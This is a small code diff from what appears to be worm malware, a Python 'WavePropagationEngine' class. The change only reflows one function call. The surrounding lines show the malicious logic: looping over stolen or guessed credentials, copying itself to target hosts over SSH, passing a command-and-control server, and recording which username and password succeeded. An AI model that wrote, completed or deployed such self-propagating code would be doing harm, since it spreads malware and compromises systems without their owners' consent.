@@ -468,7 +468,9 @@ class WavePropagationEngine:
                 for user, pwd in credentials:
                     # Attempt SSH self-copy
                     if any(p in ssh_ports for p in target_ports):
-                        transferred = self.self_copy.transfer_via_ssh(ip, user, pwd, c2_server, port=ssh_port)
+                        transferred = self.self_copy.transfer_via_ssh(
+                            ip, user, pwd, c2_server, port=ssh_port
+                        )
                         if transferred:
                             result["self_copied"] = True
                             result["credentials"] = (user, pwd)
